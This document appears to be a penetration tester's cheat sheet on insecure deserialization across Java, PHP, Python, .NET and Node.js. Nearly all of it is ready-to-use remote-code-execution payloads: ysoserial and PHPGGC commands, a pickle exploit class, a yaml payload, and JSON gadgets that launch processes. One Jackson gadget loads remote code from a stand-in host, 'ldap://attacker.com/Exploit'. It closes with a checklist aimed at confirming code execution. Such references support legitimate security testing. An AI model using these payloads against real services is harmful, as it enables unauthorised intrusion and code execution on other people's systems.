# Insecure Deserialization

## Java

### Detection
```bash
# Serialized Java object signatures
# Base64: rO0AB (AC ED 00 05)
# Look for: application/x-java-serialized-object
# Headers: Cookie, X-Serialized-Data, custom headers
```

### ysoserial Gadget Chains
```bash
# Common gadgets (check target's classpath)
java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned' | base64 -w0
java -jar ysoserial.jar CommonsCollections2 'touch /tmp/pwned' | base64 -w0
java -jar ysoserial.jar CommonsCollections3 'touch /tmp/pwned' | base64 -w0
java -jar ysoserial.jar CommonsCollections4 'touch /tmp/pwned' | base64 -w0
java -jar ysoserial.jar Spring1 'touch /tmp/pwned' | base64 -w0
java -jar ysoserial.jar Spring2 'touch /tmp/pwned' | base64 -w0
java -jar ysoserial.jar Hibernate1 'touch /tmp/pwned' | base64 -w0
java -jar ysoserial.jar Jdk7u21 'touch /tmp/pwned' | base64 -w0
java -jar ysoserial.jar ROME 'touch /tmp/pwned' | base64 -w0
```

### Jackson AutoType / @type
```json
{"@type":"java.lang.ProcessBuilder","command":["/bin/bash","-c","id"]}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

## PHP

### PHPGGC
```bash
php -d 'phar.readonly=0' phpggc Laravel/RCE1 'system("id");' --phar phar.phar
# Upload phar.phar → trigger via phar:// wrapper
```

### Common PHP Gadget Chains
| Framework | Gadget | Trigger |
|-----------|--------|---------|
| Laravel | `__destruct` in `Illuminate\Broadcasting\PendingBroadcast` | `unserialize()` |
| Symfony | `__destruct` in `Symfony\Component\Cache\Adapter\TagAwareAdapter` | `unserialize()` |
| WordPress | `__wakeup` in `WP_Object_Cache` | `unserialize()` |
| Generic | `Monolog\Handler\SyslogUdpHandler` | `__destruct` → RCE |

## Python

### Pickle RCE
```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# Send payload where pickle.loads() is called
```

### YAML Unsafe Load
```python
# yaml.load() without Loader=SafeLoader
yaml.load("!!python/object/apply:os.system ['id']")
```

## .NET

### Json.NET TypeNameHandling
```json
{
  "$type": "System.Diagnostics.Process, System.Diagnostics",
  "StartInfo": {
    "$type": "System.Diagnostics.ProcessStartInfo, System.Diagnostics",
    "FileName": "cmd",
    "Arguments": "/c calc"
  }
}
```

### BinaryFormatter / SoapFormatter
```bash
# ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c calc" -o base64
```

## Node.js

### node-serialize / funcster
```javascript
// node-serialize
{"rce":"_$$ND_FUNC$$_require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})"}

// funcster
{"@type":"funcster","func":"require('child_process').execSync('id').toString()"}
```

## Testing Checklist
```
[ ] Identify all deserialization sinks (unserialize, pickle.loads, ObjectInputStream, Json.NET, yaml.load)
[ ] Check for magic bytes / content-type indicators
[ ] Test framework-specific gadget chains
[ ] Test generic gadget chains (CommonsCollections, Spring, ROME for Java)
[ ] Test Jackson @type / AutoType
[ ] Test PHPGGC for PHP frameworks
[ ] Test pickle / yaml for Python
[ ] Test Json.NET TypeNameHandling for .NET
[ ] Test node-serialize / funcster for Node.js
[ ] Verify: RCE achieved (not just sleep/ping)
```